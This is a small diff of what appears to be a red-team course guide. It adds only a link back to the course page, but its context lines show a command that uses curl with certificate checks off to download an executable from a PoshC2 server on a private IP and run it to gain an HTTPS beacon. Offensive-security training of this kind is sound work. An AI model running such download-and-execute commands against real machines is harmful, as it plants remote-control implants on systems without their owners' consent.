@@ -33,3 +33,5 @@
     curl -k https://192.168.178.132/<poshc2-uri> -o apples.exe && .\apples.exe
     ```
 7. Boom you now have a HTTPS beacon. 
+
+## [Return to course page](README.md)
